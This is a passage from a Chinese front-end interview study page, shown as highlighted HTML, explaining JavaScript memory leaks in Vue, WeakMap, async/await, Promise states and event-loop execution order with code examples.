    <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 模拟一个比较大的数据</span>
      <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">str</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token comment">// 简单的拷贝</span>
      <span class="token punctuation">}</span>

      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'resize'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">let</span> n <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        n<span class="token operator">++</span>

        <span class="token comment">// 执行 50 次</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>打开开发者工具，选择 <code>Performance</code>，点击 <code>Record</code>，然后点击 <code>Stop</code>，在 <code>Memory</code> 选项卡中可以看到内存的使用情况。</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/b8ae23cbae7287dc.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/01/d61278c2d0d42926.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/01/eafc2ab966c30f92.png" loading="lazy" class="lazy"></p> <p><strong>3. 内存泄露的场景（Vue为例）</strong></p> <ul><li>被全局变量、函数引用，组件销毁时未清除</li> <li>被全局事件、定时器引用，组件销毁时未清除</li> <li>被自定义事件引用，组件销毁时未清除</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Memory Leak Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Memory Leak Demo'</span><span class="token punctuation">,</span>
  <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">arr</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 数组 对象</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token function">printArr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arr<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 全局变量</span>
    window<span class="token punctuation">.</span>arr <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>arr
    window<span class="token punctuation">.</span><span class="token function-variable function">printArr</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arr<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 定时器</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>intervalId <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arr<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>

    <span class="token comment">// 全局事件</span>
    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'resize'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>printArr<span class="token punctuation">)</span>
    <span class="token comment">// 自定义事件也是这样</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">// Vue2是beforeDestroy</span>
  <span class="token function">beforeUnmount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 清除全局变量</span>
    window<span class="token punctuation">.</span>arr <span class="token operator">=</span> <span class="token keyword">null</span>
    window<span class="token punctuation">.</span>printArr <span class="token operator">=</span> <span class="token keyword">null</span>

    <span class="token comment">// 清除定时器</span>
    <span class="token function">clearInterval</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>intervalId<span class="token punctuation">)</span>

    <span class="token comment">// 清除全局事件</span>
    window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'resize'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>printArr<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>4. 拓展 WeakMap WeakSet</strong></p> <p><code>weakmap</code> 和 <code>weakset</code> 都是弱引用，不会阻止垃圾回收机制回收对象。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">100</span> <span class="token punctuation">}</span>
  map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token comment">// fn1执行完 map还引用着obj</span>
<span class="token punctuation">}</span>
<span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> wMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeaMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 弱引用</span>
<span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">100</span> <span class="token punctuation">}</span>
  <span class="token comment">// fn1执行完 obj会被清理掉</span>
  wMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment">// weakMap 的 key 只能是引用类型，字符串数字都不行</span>
<span class="token punctuation">}</span>
<span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="async-await异步总结"><a href="#async-await异步总结" class="header-anchor">#</a> async/await异步总结</h3> <p><strong>知识点总结</strong></p> <ul><li><code>promise.then</code>链式调用，但也是基于回调函数</li> <li><code>async/await</code>是同步语法，彻底消灭回调函数</li></ul> <p><strong>async/await和promise的关系</strong></p> <ul><li>执行<code>async</code>函数，返回的是<code>promise</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token number">100</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// 相当于 Promise.resolve(100)</span>
</code></pre></div><ul><li><code>await</code>相当于<code>promise</code>的<code>then</code></li> <li><code>try catch</code>可捕获异常，代替了<code>promise</code>的<code>catch</code></li> <li><code>await</code> 后面跟 <code>Promise</code> 对象：会阻断后续代码，等待状态变为 <code>fulfilled</code> ，才获取结果并继续执行</li> <li><code>await</code> 后续跟非 <code>Promise</code> 对象：会直接返回</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> p1
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'p1'</span><span class="token punctuation">)</span> <span class="token comment">// 不会执行</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> p2 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> p2
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 100</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token number">100</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 100</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> p3 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'some err'</span><span class="token punctuation">)</span> <span class="token comment">// rejected状态，不会执行下面的then</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> p3 <span class="token comment">// await 相当于then</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 不会执行</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><ul><li><code>try...catch</code> 捕获 <code>rejected</code> 状态</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> p4 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'some err'</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> p4
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>总结来看：</strong></p> <ul><li><code>async</code> 封装 <code>Promise</code></li> <li><code>await</code> 处理 <code>Promise</code> 成功</li> <li><code>try...catch</code> 处理 <code>Promise</code> 失败</li></ul> <p><strong>异步本质</strong></p> <p><code>await</code> 是同步写法，但本质还是异步调用。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async1</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 start'</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 end'</span><span class="token punctuation">)</span> <span class="token comment">// 关键在这一步，它相当于放在 callback 中，最后执行</span>
  <span class="token comment">// 类似于Promise.resolve().then(()=&gt;console.log('async1 end'))</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async2'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span>
<span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span>

<span class="token comment">// 打印</span>
<span class="token comment">// script start</span>
<span class="token comment">// async1 start</span>
<span class="token comment">// async2</span>
<span class="token comment">// script end</span>
<span class="token comment">// async1 end</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async1</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 start'</span><span class="token punctuation">)</span> <span class="token comment">// 2</span>
  <span class="token keyword">await</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment">// await后面的下面三行都是异步回调callback的内容</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 end'</span><span class="token punctuation">)</span> <span class="token comment">// 5 关键在这一步，它相当于放在 callback 中，最后执行</span>
  <span class="token comment">// 类似于Promise.resolve().then(()=&gt;console.log('async1 end'))</span>
  <span class="token keyword">await</span> <span class="token function">async3</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  
  <span class="token comment">// await后面的下面1行都是异步回调callback的内容</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 end2'</span><span class="token punctuation">)</span> <span class="token comment">// 7</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async2'</span><span class="token punctuation">)</span> <span class="token comment">// 3</span>
<span class="token punctuation">}</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async3</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async3'</span><span class="token punctuation">)</span> <span class="token comment">// 6</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>
<span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span> <span class="token comment">// 4</span>
</code></pre></div><blockquote><p>即，只要遇到了 <code>await</code> ，后面的代码都相当于放在 <code>callback</code>(微任务) 里。</p></blockquote> <p><strong>执行顺序问题</strong></p> <p>网上很经典的面试题</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async1</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 start'</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 这一句会同步执行，返回 Promise ，其中的 `console.log('async2')` 也会同步执行</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 end'</span><span class="token punctuation">)</span> <span class="token comment">// 上面有 await ，下面就变成了“异步”，类似 cakkback 的功能（微任务）</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async2'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span>

<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 异步，宏任务</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">new</span> <span class="token class-name">Promise</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 返回 Promise 之后，即同步执行完成，then 是异步代码</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise1'</span><span class="token punctuation">)</span> <span class="token comment">// Promise 的函数体会立刻执行</span>
  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 异步，微任务</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise2'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span>

<span class="token comment">// 同步代码执行完之后，屡一下现有的异步未执行的，按照顺序</span>
<span class="token comment">// 1. async1 函数中 await 后面的内容 —— 微任务（先注册先执行）</span>
<span class="token comment">// 2. setTimeout —— 宏任务（先注册先执行）</span>
<span class="token comment">// 3. then —— 微任务</span>

<span class="token comment">// 同步代码执行完毕（event loop - call stack被清空）</span>
<span class="token comment">// 执行微任务</span>
<span class="token comment">// 尝试DOM渲染</span>
<span class="token comment">// 触发event loop执行宏任务</span>

<span class="token comment">// 输出</span>
<span class="token comment">// script start </span>
<span class="token comment">// async1 start  </span>
<span class="token comment">// async2</span>
<span class="token comment">// promise1</span>
<span class="token comment">// script end</span>
<span class="token comment">// async1 end</span>
<span class="token comment">// promise2</span>
<span class="token comment">// setTimeout</span>
</code></pre></div><p><strong>关于for...of</strong></p> <ul><li><code>for in</code>以及<code>forEach</code>都是常规的同步遍历</li> <li><code>for of</code>用于异步遍历</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 定时算乘法</span>
<span class="token keyword">function</span> <span class="token function">multi</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">resolve</span><span class="token punctuation">(</span>num <span class="token operator">*</span> num<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 使用 forEach ，是 1s 之后打印出所有结果，即 3 个值是一起被计算出来的</span>
<span class="token keyword">function</span> <span class="token function">test1</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  nums<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token parameter">x</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">multi</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 一次性打印</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 使用 for...of ，可以让计算挨个串行执行</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">test2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> x <span class="token keyword">of</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 在 for...of 循环体的内部，遇到 await 会挨个串行计算</span>
    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">multi</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 依次打印</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="promise异步总结"><a href="#promise异步总结" class="header-anchor">#</a> Promise异步总结</h3> <p><strong>知识点总结</strong></p> <ul><li><strong>三种状态</strong> <ul><li><code>pending</code>、<code>fulfilled</code>(通过<code>resolve</code>触发)、<code>rejected</code>(通过<code>reject</code>触发)</li> <li><code>pending =&gt; fulfilled</code>或者<code>pending =&gt; rejected</code></li> <li>状态变化不可逆</li></ul></li> <li><strong>状态的表现和变化</strong> <ul><li><code>pending</code>状态，不会触发<code>then</code>和<code>catch</code></li> <li><code>fulfilled</code>状态会触发后续的<code>then</code>回调</li> <li><code>rejected</code>状态会触发后续的<code>catch</code>回调</li></ul></li> <li><strong>then和catch对状态的影响（重要）</strong> <ul><li><code>then</code>正常返回<code>fulfilled</code>，里面有报错返回<code>rejected</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> p1 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token number">100</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'p1'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span> <span class="token comment">// fulfilled会触发后续then回调</span>
